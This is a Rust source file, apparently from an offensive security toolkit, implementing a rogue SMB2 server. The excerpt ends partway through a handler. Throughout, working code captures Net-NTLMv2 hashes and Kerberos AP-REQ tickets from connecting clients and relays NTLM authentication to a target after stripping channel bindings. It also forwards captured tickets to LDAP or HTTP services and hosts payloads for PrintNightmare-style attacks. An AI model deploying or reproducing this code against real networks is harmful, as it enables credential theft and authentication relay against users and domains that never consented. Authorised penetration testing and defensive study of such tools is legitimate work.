//! Full SMB2 protocol server daemon.
//!
//! Listens on port 445 and handles the full SMB2 protocol:
//! - Negotiate (SMB 2.0.2 through 3.1.1) with pre-auth integrity
//! - Session Setup with NTLMSSP challenge/response and credential capture
//! - Tree Connect, Create, Read, Write, Close (for named pipe access)
//! - Ioctl (FSCTL_PIPE_TRANSCEIVE for DCE/RPC relay)
//! - Tree Disconnect and Logoff
//!
//! Two modes:
//! - **Capture**: extract Net-NTLMv2 hashes from Session Setup
//! - **Relay**: forward authenticated session to a target for DCE/RPC relay

use crate::krb_capture::CapturedKerberosTicket;
use crate::responder::CapturedCredential;
use crate::{RelayError, Result};
use aes::Aes128;
use cmac::Cmac;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256, Sha512};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU16, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tracing::{debug, info, warn};

// ===========================================================
// Constants
// ===========================================================

const SMB2_PROTOCOL: &[u8; 4] = b"\xfeSMB";
const SMB2_HEADER_SIZE: usize = 64;
const NTLMSSP_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

// SMB2 commands
const SMB2_NEGOTIATE: u16 = 0x0000;
const SMB2_SESSION_SETUP: u16 = 0x0001;
const SMB2_LOGOFF: u16 = 0x0002;
const SMB2_TREE_CONNECT: u16 = 0x0003;
const SMB2_TREE_DISCONNECT: u16 = 0x0004;
const SMB2_CREATE: u16 = 0x0005;
const SMB2_CLOSE: u16 = 0x0006;
const SMB2_READ: u16 = 0x0008;
const SMB2_WRITE: u16 = 0x0009;
const SMB2_IOCTL: u16 = 0x000B;
const SMB2_QUERY_DIRECTORY: u16 = 0x000E;

// SMB2 dialects
const SMB2_DIALECT_202: u16 = 0x0202;
const SMB2_DIALECT_210: u16 = 0x0210;
const SMB2_DIALECT_300: u16 = 0x0300;
const SMB2_DIALECT_302: u16 = 0x0302;
const SMB2_DIALECT_311: u16 = 0x0311;

const SMB2_FLAGS_SERVER_TO_REDIR: u32 = 0x0001;
#[expect(dead_code)]
const SMB2_FLAGS_SIGNED: u32 = 0x0008;

const STATUS_SUCCESS: u32 = 0x0000_0000;
const STATUS_MORE_PROCESSING_REQUIRED: u32 = 0xC000_0016;
const STATUS_LOGON_FAILURE: u32 = 0xC000_006D;
const STATUS_OBJECT_NAME_NOT_FOUND: u32 = 0xC000_0034;
const STATUS_INVALID_PARAMETER: u32 = 0xC000_000D;
const STATUS_NOT_SUPPORTED: u32 = 0xC000_00BB;
const STATUS_OBJECT_NAME_COLLISION: u32 = 0xC000_0035;
const STATUS_ACCESS_DENIED: u32 = 0xC000_0022;

const FSCTL_PIPE_TRANSCEIVE: u32 = 0x0011_C017;

const SHARE_TYPE_PIPE: u8 = 0x02;
const SHARE_TYPE_DISK: u8 = 0x01;

const OPLOCK_LEVEL_NONE: u8 = 0x00;
const FILE_OPEN: u32 = 0x0001;

// SMB2 Create dispositions (MS-SMB2 2.2.13)
const FILE_SUPERSEDE: u32 = 0x0000_0000;
// FILE_OPEN is defined above (0x0000_0001)
const FILE_CREATE: u32 = 0x0000_0002;
const FILE_OPEN_IF: u32 = 0x0000_0003;
const FILE_OVERWRITE: u32 = 0x0000_0004;
const FILE_OVERWRITE_IF: u32 = 0x0000_0005;

// SMB2 Create options
const FILE_DIRECTORY_FILE: u32 = 0x0000_0001;

// SMB2 Create desired-access bits used by the file share
const FILE_READ_DATA: u32 = 0x0000_0001;
const FILE_WRITE_DATA: u32 = 0x0000_0002;

// SMB2 QUERY_DIRECTORY FileInformationClass values (MS-SMB2 2.2.33)
const FILE_DIRECTORY_INFORMATION_CLASS: u8 = 0x01;

// SMB2 QUERY_DIRECTORY request flags
const QUERY_DIRECTORY_RETURN_SINGLE_ENTRY: u8 = 0x02;

// File attributes (MS-FSCC 2.6)
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;

// Windows FILETIME epoch: 100ns intervals since 1601-01-01
const FILETIME_EPOCH_DIFF_SECS: u64 = 11_644_473_600;

/// Convert SystemTime to Windows FILETIME (100ns units since 1601-01-01).
fn systemtime_to_filetime(t: SystemTime) -> u64 {
    match t.duration_since(UNIX_EPOCH) {
        Ok(d) => {
            let intervals = d.as_nanos() as u64 / 100;
            (FILETIME_EPOCH_DIFF_SECS * 10_000_000).saturating_add(intervals)
        }
        Err(_) => 0,
    }
}

/// Safely read a u16 from a byte slice at the given offset.
/// Returns None if the slice is too short.
fn read_u16_le(data: &[u8], offset: usize) -> Option<u16> {
    data.get(offset..offset + 2)
        .map(|b| u16::from_le_bytes([b[0], b[1]]))
}

/// Safely read a u32 from a byte slice at the given offset.
/// Returns None if the slice is too short.
fn read_u32_le(data: &[u8], offset: usize) -> Option<u32> {
    data.get(offset..offset + 4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

/// Safely read a u64 from a byte slice at the given offset.
/// Returns None if the slice is too short.
fn read_u64_le(data: &[u8], offset: usize) -> Option<u64> {
    data.get(offset..offset + 8)
        .map(|b| u64::from_le_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
}

// ===========================================================
// Configuration
// ===========================================================

#[derive(Debug, Clone)]
pub enum SmbDaemonMode {
    Capture,
    Relay {
        target_host: String,
        target_port: u16,
    },
    /// Impacket smbserver.py parity: serve a local directory as an SMB2 file
    /// share (payload hosting for PrintNightmare / Coerced-Potato style
    /// attacks). Any tree connect maps onto `share_root`.
    FileShare {
        share_name: String,
        share_root: PathBuf,
    },
}

#[derive(Debug, Clone)]
pub struct SmbDaemonConfig {
    pub listen_ip: String,
    pub listen_port: u16,
    pub challenge: Option<[u8; 8]>,
    pub mode: SmbDaemonMode,
    pub domain_name: String,
    /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
    pub socks5_proxy: Option<String>,
    /// krbrelayx parity: advertise the krb5 SASL mech in session setup and
    /// capture AP-REQ tickets handed over by domain clients. Captured tickets
    /// are retrievable via [`SmbDaemon::get_captured_tickets`].
    pub capture_kerberos: bool,
    /// krbrelayx `--relay` parity: when set, every captured AP-REQ is
    /// forwarded to this target (ldap/ldaps/http/https only) as SASL
    /// GSS-SPNEGO. See [`crate::krb_relay::relay_kerberos`].
    pub krb_relay_target: Option<crate::RelayTarget>,
}

impl Default for SmbDaemonConfig {
    fn default() -> Self {
        Self {
            listen_ip: "::".into(),
            listen_port: 445,
            challenge: None,
            mode: SmbDaemonMode::Capture,
            domain_name: "LAN".into(),
            socks5_proxy: None,
            capture_kerberos: false,
            krb_relay_target: None,
        }
    }
}

// ===========================================================
// Session state per client
// ===========================================================

struct SmbFile {
    persistent_id: u64,
    write_data: Vec<u8>,
    /// Disk-backed file (FileShare mode): resolved local path.
    path: Option<PathBuf>,
    /// Opened for writing; `write_data` is flushed to `path` on close.
    for_write: bool,
}

/// Relay-side SMB2 connection state
struct SmbRelaySession {
    stream: TcpStream,
    session_id: u64,
    message_id: u64,
    tree_id: u32,
    file_id: Option<[u8; 16]>,
}

struct SmbClientSession {
    session_id: u64,
    session_key: Option<Vec<u8>>,
    session_setup_complete: bool,
    sign_required: bool,
    dialect: u16,
    tree_id: u32,
    capabilities: u32,
    max_transact_size: u32,
    max_read_size: u32,
    max_write_size: u32,
    open_files: Vec<SmbFile>,
    ntlm_challenge: [u8; 8],
    client_preauth_salt: Option<Vec<u8>>,
    client_negotiate_req: Vec<u8>,
    relay_session: Option<SmbRelaySession>,
    signing_key: Option<Vec<u8>>,
    /// When the daemon runs in FileShare mode, the local directory backing
    /// every tree connect. Set once per connection from `SmbDaemonMode`.
    file_share_root: Option<PathBuf>,
}

impl SmbClientSession {
    fn new() -> Self {
        Self {
            session_id: rand::random::<u64>() & 0x00FF_FFFF_FFFF_FFFF,
            session_key: None,
            session_setup_complete: false,
            sign_required: false,
            dialect: SMB2_DIALECT_311,
            tree_id: 0,
            capabilities: 0,
            max_transact_size: 65536,
            max_read_size: 65536,
            max_write_size: 65536,
            open_files: Vec::new(),
            ntlm_challenge: rand::random::<[u8; 8]>(),
            client_preauth_salt: None,
            client_negotiate_req: Vec::new(),
            relay_session: None,
            signing_key: None,
            file_share_root: None,
        }
    }
}

// ===========================================================
// SMBDaemon
// ===========================================================

pub struct SmbDaemon {
    config: SmbDaemonConfig,
    running: Arc<AtomicBool>,
    captured: Arc<Mutex<Vec<CapturedCredential>>>,
    /// AP-REQ tickets captured when `capture_kerberos` is enabled
    captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
    /// Actual bound TCP port (resolves ephemeral port 0 binds, used by tests).
    bound_port: Arc<AtomicU16>,
}

impl SmbDaemon {
    pub fn new(config: SmbDaemonConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            captured: Arc::new(Mutex::new(Vec::new())),
            captured_tickets: Arc::new(Mutex::new(Vec::new())),
            bound_port: Arc::new(AtomicU16::new(0)),
        }
    }

    /// All NTLM credentials captured so far (alias kept for readability).
    pub fn get_captured(&self) -> Vec<CapturedCredential> {
        self.get_captured_credentials()
    }

    /// All Kerberos AP-REQ tickets captured so far (krbrelayx parity).
    pub fn get_captured_tickets(&self) -> Vec<CapturedKerberosTicket> {
        self.captured_tickets
            .lock()
            .unwrap_or_else(|e| {
                warn!("Mutex poisoned in SMBDaemon tickets");
                e.into_inner()
            })
            .clone()
    }

    /// The port the listener actually bound (0 until `start()` succeeds).
    pub fn bound_port(&self) -> u16 {
        self.bound_port.load(Ordering::SeqCst)
    }

    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("SMBDaemon already running".into()).into());
        }
        let addr = crate::utils::format_addr(&self.config.listen_ip, self.config.listen_port);
        let listener = TcpListener::bind(&addr)
            .await
            .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port {}: {}", addr, e)))?;
        if let Ok(local) = listener.local_addr() {
            self.bound_port.store(local.port(), Ordering::SeqCst);
        }
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let config = self.config.clone();
        let captured = self.captured.clone();
        let captured_tickets = self.captured_tickets.clone();
        info!(
            "SMBDaemon listening on {}:{} (mode: {:?}, kerberos capture: {})",
            config.listen_ip, config.listen_port, config.mode, config.capture_kerberos
        );
        tokio::spawn(async move {
            Self::accept_loop(listener, running, config, captured, captured_tickets).await;
        });
        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        self.captured
            .lock()
            .unwrap_or_else(|e| {
                warn!("Mutex poisoned in SMBDaemon");
                e.into_inner()
            })
            .clone()
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    // =======================================================
    // Internal: Connection handling
    // =======================================================

    async fn accept_loop(
        listener: TcpListener,
        running: Arc<AtomicBool>,
        config: SmbDaemonConfig,
        captured: Arc<Mutex<Vec<CapturedCredential>>>,
        captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
    ) {
        while running.load(Ordering::SeqCst) {
            match listener.accept().await {
                Ok((stream, peer)) => {
                    debug!("SMB connection from {}", peer);
                    let config = config.clone();
                    let captured = captured.clone();
                    let captured_tickets = captured_tickets.clone();
                    let running = running.clone();
                    tokio::spawn(async move {
                        if let Err(e) =
                            Self::handle_client(stream, config, captured, captured_tickets, running)
                                .await
                        {
                            debug!("SMB client handler error: {}", e);
                        }
                    });
                }
                Err(e) => {
                    if !running.load(Ordering::SeqCst) {
                        break;
                    }
                    warn!("SMB accept error: {}", e);
                }
            }
        }
        info!("SMBDaemon accept loop stopped");
    }

    async fn handle_client(
        mut stream: TcpStream,
        config: SmbDaemonConfig,
        captured: Arc<Mutex<Vec<CapturedCredential>>>,
        captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
        running: Arc<AtomicBool>,
    ) -> Result<()> {
        let peer_addr = stream
            .peer_addr()
            .ok()
            .map(|a| a.to_string())
            .unwrap_or_default();
        let mut session = SmbClientSession::new();
        if let Some(ch) = config.challenge {
            session.ntlm_challenge = ch;
        }
        if let SmbDaemonMode::FileShare { share_root, .. } = &config.mode {
            session.file_share_root = Some(share_root.clone());
        }

        let mut buf = vec![0u8; 65536];

        while running.load(Ordering::SeqCst) {
            let n = match stream.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => n,
                Err(e) => {
                    debug!("SMB read error from {}: {}", peer_addr, e);
                    break;
                }
            };
            let data = &buf[..n];

            // Skip NetBIOS session header
            let smb2_start = if data.len() > 4 && data[0] == 0x00 {
                4
            } else {
                0
            };
            if data.len() < smb2_start + SMB2_HEADER_SIZE {
                break;
            }
            if &data[smb2_start..smb2_start + 4] != SMB2_PROTOCOL {
                if data.len() > 4 && &data[smb2_start..smb2_start + 4] == b"\xffSMB" {
                    let resp = Self::build_smb1_negotiate_response(
                        session.ntlm_challenge,
                        &config.domain_name,
                    );
                    let _ = stream.write_all(&resp).await;
                }
                break;
            }

            let command = match read_u16_le(&data[smb2_start..], 12) {
                Some(c) => c,
                None => break,
            };
            let message_id = match read_u64_le(&data[smb2_start..], 24) {
                Some(id) => id,
                None => break,
            };

            debug!(
                "SMB command 0x{:04X} mid {} from {}",
                command, message_id, peer_addr
            );

            let (status, response) = match command {
                SMB2_NEGOTIATE => {
                    Self::handle_negotiate(&data[smb2_start..], &mut session, &config)
                }
                SMB2_SESSION_SETUP => {
                    Self::handle_session_setup(
                        &data[smb2_start..],
                        &mut session,
                        &config,
                        &captured,
                        &captured_tickets,
                        &peer_addr,
                    )
                    .await
                }
                SMB2_TREE_CONNECT => {
                    Self::handle_tree_connect(&data[smb2_start..], &mut session).await
                }
                SMB2_TREE_DISCONNECT => Self::handle_tree_disconnect(&mut session),
                SMB2_CREATE => Self::handle_create(&data[smb2_start..], &mut session).await,
                SMB2_CLOSE => Self::handle_close(&data[smb2_start..], &mut session),
                SMB2_READ => Self::handle_read(&data[smb2_start..], &mut session),
                SMB2_WRITE => Self::handle_write(&data[smb2_start..], &mut session),
                SMB2_IOCTL => Self::handle_ioctl(&data[smb2_start..], &mut session).await,
                SMB2_LOGOFF => Self::handle_logoff(&mut session),
                SMB2_QUERY_DIRECTORY => {
                    Self::handle_query_directory(&data[smb2_start..], &mut session).await
                }
                _ => (STATUS_NOT_SUPPORTED, vec![]),
            };

            let mut response_pkt = Self::build_response_header(
                command,
                status,
                message_id,
                session.session_id,
                session.tree_id,
                &response,
            );

            // Sign response if we have the signing key
            if session.signing_key.is_some() && status == STATUS_SUCCESS {
                Self::sign_smb2_response(&session, &mut response_pkt);
            }

            if let Err(e) = stream.write_all(&response_pkt).await {
                debug!("SMB write error to {}: {}", peer_addr, e);
                break;
            }

            if command == SMB2_SESSION_SETUP && status == STATUS_SUCCESS {
                session.session_setup_complete = true;
            }
        }
        Ok(())
    }

    // =======================================================
    // Internal: Command handlers
    // =======================================================

    fn handle_negotiate(
        data: &[u8],
        session: &mut SmbClientSession,
        config: &SmbDaemonConfig,
    ) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 36 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        session.client_negotiate_req = data.to_vec();
        let dialect_count = u16::from_le_bytes([body[20], body[21]]) as usize;
        let client_sec_mode = body[2];

        let has_311 = (0..dialect_count).any(|i| {
            let off = 36 + i * 2;
            off + 2 <= body.len()
                && u16::from_le_bytes([body[off], body[off + 1]]) == SMB2_DIALECT_311
        });

        let dialects_end = 36 + dialect_count * 2;

        if has_311 && dialects_end + 8 <= body.len() {
            let context_start = dialects_end + ((8 - (dialects_end % 8)) % 8);
            let mut ctx_off = context_start;
            while ctx_off + 8 <= body.len() {
                let ctx_type = u16::from_le_bytes([body[ctx_off], body[ctx_off + 1]]);
                let ctx_len = u16::from_le_bytes([body[ctx_off + 2], body[ctx_off + 3]]) as usize;
                let ctx_data_off = ctx_off + 8;
                if ctx_type == 1 && ctx_len >= 36 && ctx_data_off + 36 <= body.len() {
                    let salt_len =
                        u16::from_le_bytes([body[ctx_data_off + 2], body[ctx_data_off + 3]]);
                    if salt_len >= 32 && ctx_data_off + 8 + 32 <= body.len() {
                        session.client_preauth_salt =
                            Some(body[ctx_data_off + 8..ctx_data_off + 40].to_vec());
                        debug!("SMB 3.1.1 pre-auth integrity salt captured");
                    }
                    break;
                }
                ctx_off += 8 + ctx_len + ((8 - (ctx_len % 8)) % 8);
                if ctx_len == 0 {
                    break;
                }
            }
        }

        let selected_dialect = if has_311 {
            SMB2_DIALECT_311
        } else {
            let mut best = SMB2_DIALECT_202;
            for i in 0..dialect_count {
                let off = 36 + i * 2;
                if off + 2 <= body.len() {
                    match u16::from_le_bytes([body[off], body[off + 1]]) {
                        SMB2_DIALECT_210 if best < SMB2_DIALECT_210 => best = SMB2_DIALECT_210,
                        SMB2_DIALECT_300 if best < SMB2_DIALECT_300 => best = SMB2_DIALECT_300,
                        SMB2_DIALECT_302 if best < SMB2_DIALECT_302 => best = SMB2_DIALECT_302,
                        _ => {}
                    }
                }
            }
            best
        };

        session.dialect = selected_dialect;
        session.sign_required = (client_sec_mode & 2) != 0;
        session.capabilities = 0x0000_0001 | 0x0000_0004;
        session.max_transact_size = 1048576;
        session.max_read_size = 1048576;
        session.max_write_size = 1048576;

        let ntlm_challenge =
            Self::build_ntlm_challenge(session.ntlm_challenge, &config.domain_name);
        let spnego_blob = Self::wrap_spnego_init(&ntlm_challenge);

        let is_311 = selected_dialect == SMB2_DIALECT_311;
        let mut resp = Vec::with_capacity(256);

        resp.extend_from_slice(&65u16.to_le_bytes());
        resp.extend_from_slice(&0u16.to_le_bytes());
        resp.extend_from_slice(&selected_dialect.to_le_bytes());
        resp.extend_from_slice(&[0u8; 2]);
        resp.extend_from_slice(&[0u8; 16]);
        resp.extend_from_slice(&session.capabilities.to_le_bytes());
        resp.extend_from_slice(&session.max_transact_size.to_le_bytes());
        resp.extend_from_slice(&session.max_read_size.to_le_bytes());
        resp.extend_from_slice(&session.max_write_size.to_le_bytes());
        let filetime = Self::filetime_now();
        resp.extend_from_slice(&filetime.to_le_bytes());
        resp.extend_from_slice(&filetime.to_le_bytes());

        let sec_buf_offset_field_pos = resp.len();
        resp.extend_from_slice(&0u16.to_le_bytes());
        resp.extend_from_slice(&0u16.to_le_bytes());
        resp.extend_from_slice(&[0u8; 4]);

        let neg_ctx_offset_field_pos;
        if is_311 {
            neg_ctx_offset_field_pos = resp.len();
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&0u16.to_le_bytes());
            resp.extend_from_slice(&0u16.to_le_bytes());
        } else {
            neg_ctx_offset_field_pos = 0;
        }

        let fixed_body_len = resp.len();
        let sec_buf_offset: u16 = (SMB2_HEADER_SIZE + fixed_body_len) as u16;
        let sec_buf_len: u16 = spnego_blob.len() as u16;
        let offset_bytes = sec_buf_offset.to_le_bytes();
        let len_bytes = sec_buf_len.to_le_bytes();
        resp[sec_buf_offset_field_pos] = offset_bytes[0];
        resp[sec_buf_offset_field_pos + 1] = offset_bytes[1];
        resp[sec_buf_offset_field_pos + 2] = len_bytes[0];
        resp[sec_buf_offset_field_pos + 3] = len_bytes[1];

        resp.truncate(fixed_body_len);
        resp.extend_from_slice(&spnego_blob);

        if is_311 {
            while (resp.len() % 8) != 0 {
                resp.push(0);
            }
            let neg_ctx_body_start = resp.len();
            let neg_ctx_offset: u32 = (SMB2_HEADER_SIZE + neg_ctx_body_start) as u32;

            resp.extend_from_slice(&1u16.to_le_bytes());
            resp.extend_from_slice(&40u16.to_le_bytes());
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&1u16.to_le_bytes());
            resp.extend_from_slice(&32u16.to_le_bytes());
            resp.extend_from_slice(&[0u8; 2]);
            resp.extend_from_slice(&1u16.to_le_bytes());
            let salt_field_pos = resp.len();
            resp.extend_from_slice(&[0u8; 32]);

            while (resp.len() % 8) != 0 {
                resp.push(0);
            }

            resp.extend_from_slice(&2u16.to_le_bytes());
            resp.extend_from_slice(&12u16.to_le_bytes());
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&3u16.to_le_bytes());
            resp.extend_from_slice(&[0u8; 2]);
            resp.extend_from_slice(&3u16.to_le_bytes());
            resp.extend_from_slice(&2u16.to_le_bytes());
            resp.extend_from_slice(&1u16.to_le_bytes());

            while (resp.len() % 8) != 0 {
                resp.push(0);
            }

            let count_bytes = 2u16.to_le_bytes();
            resp[neg_ctx_offset_field_pos..neg_ctx_offset_field_pos + 4]
                .copy_from_slice(&neg_ctx_offset.to_le_bytes());
            resp[neg_ctx_offset_field_pos + 4] = count_bytes[0];
            resp[neg_ctx_offset_field_pos + 5] = count_bytes[1];

            if salt_field_pos + 32 <= resp.len()
                && let Some(client_salt) = session.client_preauth_salt.clone()
            {
                for i in 0..32 {
                    resp[salt_field_pos + i] = 0;
                }

                let server_full_msg = Self::build_full_message_for_hash(&resp);
                let mut hasher = Sha512::new();
                let client_msg = if session.client_negotiate_req.len() > 4
                    && session.client_negotiate_req[0] == 0x00
                {
                    &session.client_negotiate_req[4..]
                } else {
                    &session.client_negotiate_req
                };
                hasher.update(client_msg);
                hasher.update(&server_full_msg);
                let hash1 = hasher.finalize();

                let mut final_hasher = Sha512::new();
                final_hasher.update(&client_salt);
                final_hasher.update(hash1);
                let final_hash = final_hasher.finalize();
                resp[salt_field_pos..salt_field_pos + 32].copy_from_slice(&final_hash[..32]);
                debug!("SMB 3.1.1 pre-auth integrity hash computed");
            }
        }
        (STATUS_SUCCESS, resp)
    }

    /// Handle SMB2 Session Setup (0x0001) -- now async for relay forwarding
    async fn handle_session_setup(
        data: &[u8],
        session: &mut SmbClientSession,
        config: &SmbDaemonConfig,
        captured: &Arc<Mutex<Vec<CapturedCredential>>>,
        captured_tickets: &Arc<Mutex<Vec<CapturedKerberosTicket>>>,
        peer_addr: &str,
    ) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 8 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        let sec_buf_offset = u16::from_le_bytes([body[4], body[5]]) as usize;
        let sec_buf_len = u16::from_le_bytes([body[6], body[7]]) as usize;
        if sec_buf_offset + sec_buf_len > data.len() {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        let sec_data = &data[sec_buf_offset..sec_buf_offset + sec_buf_len];
        let ntlmssp = Self::extract_ntlmssp(sec_data);

        // krbrelayx parity: no NTLM blob in the buffer -- try to treat it as
        // a Kerberos AP-REQ (client followed the krb5 mech negotiation).
        if ntlmssp.is_empty() && config.capture_kerberos {
            let peer_ip = peer_addr.split(':').next().unwrap_or(peer_addr);
            return match Self::capture_kerberos_apreq(sec_data, captured_tickets, peer_ip) {
                Some(()) => {
                    // krbrelayx --relay parity: forward the captured AP-REQ
                    // to the configured target (fire-and-forget one-shot; the
                    // SMB session-setup response is returned immediately).
                    if let Some(target) = config.krb_relay_target.clone() {
                        let blob = sec_data.to_vec();
                        tokio::spawn(async move {
                            let outcome = crate::krb_relay::relay_kerberos(
                                &target,
                                &blob,
                                Duration::from_secs(15),
                            )
                            .await;
                            if outcome.is_success() {
                                info!("Kerberos relay: {}", outcome.summary());
                            } else {
                                warn!("Kerberos relay: {}", outcome.summary());
                            }
                        });
                    }
                    (STATUS_SUCCESS, vec![0x04, 0x00])
                }
                None => (STATUS_LOGON_FAILURE, vec![]),
            };
        }
        if ntlmssp.is_empty() {
            return (STATUS_LOGON_FAILURE, vec![]);
        }

        let msg_type = u32::from_le_bytes([ntlmssp[8], ntlmssp[9], ntlmssp[10], ntlmssp[11]]);

        match msg_type {
            1 => {
                debug!("NTLMSSP Type 1 received");
                // In relay mode: forward to target to get the real challenge
                if let SmbDaemonMode::Relay {
                    target_host,
                    target_port,
                } = &config.mode
                {
                    match Self::relay_negotiate_and_type1(
                        target_host,
                        *target_port,
                        session,
                        data,
                        config.socks5_proxy.as_deref(),
                    )
                    .await
                    {
                        Ok((challenge_blob, relay_sess)) => {
                            session.relay_session = Some(relay_sess);
                            // Strip channel binding from the challenge for the victim
                            let cleaned =
                                Self::strip_channel_bindings_from_challenge(&challenge_blob);
                            let spnego = Self::wrap_spnego_response(&cleaned);

                            let mut resp = Vec::with_capacity(32);
                            resp.extend_from_slice(&9u16.to_le_bytes());
                            resp.push(0x00);
                            resp.push(0x00);
                            let sec_off = 64 + resp.len() as u16 + 4;
                            resp.extend_from_slice(&sec_off.to_le_bytes());
                            resp.extend_from_slice(&(spnego.len() as u16).to_le_bytes());
                            while resp.len() < sec_off as usize - 64 {
                                resp.push(0);
                            }
                            resp.extend_from_slice(&spnego);
                            return (STATUS_MORE_PROCESSING_REQUIRED, resp);
                        }
                        Err(e) => {
                            debug!("Relay Type1 failed: {}", e);
                            return (STATUS_LOGON_FAILURE, vec![]);
                        }
                    }
                }

                // Capture mode: send our own challenge -- or, in krbrelayx
                // capture mode, redirect the client to the Kerberos mech and
                // wait for the AP-REQ in the next leg.
                let spnego = if config.capture_kerberos {
                    debug!("Type 1 -> advertising krb5 mech (kerberos capture)");
                    crate::krb_capture::build_krb5_spnego_challenge()
                } else {
                    debug!("NTLMSSP Type 1 -> sending challenge");
                    let challenge =
                        Self::build_ntlm_challenge(session.ntlm_challenge, &config.domain_name);
                    Self::wrap_spnego_response(&challenge)
                };
                let mut resp = Vec::with_capacity(32);
                resp.extend_from_slice(&9u16.to_le_bytes());
                resp.push(0x00);
                resp.push(0x00);
                let sec_off = 64 + resp.len() as u16 + 4;
                resp.extend_from_slice(&sec_off.to_le_bytes());
                resp.extend_from_slice(&(spnego.len() as u16).to_le_bytes());
                while resp.len() < sec_off as usize - 64 {
                    resp.push(0);
                }
                resp.extend_from_slice(&spnego);
                (STATUS_MORE_PROCESSING_REQUIRED, resp)
            }
            3 => {
                debug!("NTLMSSP Type 3 received, extracting credentials");
                let peer_ip = peer_addr.split(':').next().unwrap_or(peer_addr);
                Self::capture_ntlm_credentials(&ntlmssp, session.ntlm_challenge, captured, peer_ip);

                // In relay mode: forward Type 3 to target and extract session key
                if let Some(ref mut relay_sess) = session.relay_session {
                    match Self::relay_type3_and_extract_key(relay_sess, &ntlmssp).await {
                        Ok((target_session_id, signing_key)) => {
                            relay_sess.session_id = target_session_id;
                            session.session_key = Some(signing_key.clone());
                            session.signing_key = Some(Self::derive_smb_signing_key(
                                &signing_key,
                                session.dialect,
                                &session.client_preauth_salt,
                            ));
                            debug!("Relay authentication succeeded, session key derived");
                        }
                        Err(e) => {
                            debug!("Relay Type3 failed: {}", e);
                            return (STATUS_LOGON_FAILURE, vec![]);
                        }
                    }
                } else {
                    // Capture mode: try to derive session key (will be None without NT hash)
                    if let Some(sk) = Self::derive_session_key(&ntlmssp) {
                        session.session_key = Some(sk);
                    }
                }

                let mut resp = Vec::with_capacity(32);
                resp.extend_from_slice(&9u16.to_le_bytes());
                resp.push(0x00);
                resp.push(0x00);
                resp.extend_from_slice(&0u16.to_le_bytes());
                resp.extend_from_slice(&0u16.to_le_bytes());
                session.session_setup_complete = true;
                (STATUS_SUCCESS, resp)
            }
            _ => {
                debug!("Unknown NTLMSSP type {}", msg_type);
                (STATUS_LOGON_FAILURE, vec![])
            }
        }
    }

    /// Handle SMB2 Tree Connect (0x0003) -- forward in relay mode
    async fn handle_tree_connect(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 8 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        let path_off = u16::from_le_bytes([body[4], body[5]]) as usize;
        let path_len = u16::from_le_bytes([body[6], body[7]]) as usize;
        if path_off + path_len > data.len() {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let path_bytes = &data[path_off..path_off + path_len];
        let path = String::from_utf16_lossy(
            &path_bytes
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        debug!("Tree connect to: {}", path);

        // In relay mode, forward to target
        if let Some(ref mut relay) = session.relay_session {
            return Self::relay_tree_connect(relay, &path).await;
        }

        // FileShare mode: any share maps onto the backing directory
        if session.file_share_root.is_some() {
            debug!(
                "FileShare: tree connect to {} -> {:?}",
                path, session.file_share_root
            );
            session.tree_id = rand::random::<u32>() & 0x0000_FFFF;
            let mut resp = Vec::with_capacity(16);
            resp.extend_from_slice(&16u16.to_le_bytes());
            resp.push(SHARE_TYPE_DISK);
            resp.push(0x00);
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&0x001F_01FFu32.to_le_bytes());
            return (STATUS_SUCCESS, resp);
        }

        // Capture mode: only IPC$
        if path.contains("IPC$") || path.contains("ipc$") {
            session.tree_id = rand::random::<u32>() & 0x0000_FFFF;
            let mut resp = Vec::with_capacity(32);
            resp.extend_from_slice(&16u16.to_le_bytes());
            resp.push(SHARE_TYPE_PIPE);
            resp.push(0x00);
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&0u32.to_le_bytes());
            resp.extend_from_slice(&0x001F_01FFu32.to_le_bytes());
            (STATUS_SUCCESS, resp)
        } else {
            (STATUS_OBJECT_NAME_NOT_FOUND, vec![])
        }
    }

    fn handle_tree_disconnect(session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        session.tree_id = 0;
